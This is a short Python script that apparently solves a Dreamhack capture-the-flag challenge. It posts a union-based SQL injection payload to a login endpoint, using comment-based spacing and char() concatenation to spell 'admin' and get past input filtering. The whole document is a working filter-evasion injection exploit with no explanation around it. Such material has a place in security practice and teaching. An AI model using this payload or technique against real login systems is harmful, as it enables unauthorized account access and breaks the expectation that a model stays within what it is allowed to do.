import requests

url="http://host3.dreamhack.games:16782/login"

data = {
    'level' : '0/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))'
}

res=requests.post(url, data=data)

print(res.text)
